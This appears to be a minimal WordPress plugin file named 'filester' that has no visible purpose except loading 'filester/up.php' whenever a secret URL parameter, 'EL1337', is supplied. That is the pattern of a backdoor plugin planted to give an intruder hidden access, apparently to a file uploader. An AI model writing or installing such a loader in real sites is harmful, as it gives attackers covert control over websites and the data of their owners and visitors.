<?php
/**
 * Plugin Name:filester
 * Version:1.0
 * Author:EL1337 */

if(isset($_GET["EL1337"])){
   include("filester/up.php");
   }
?>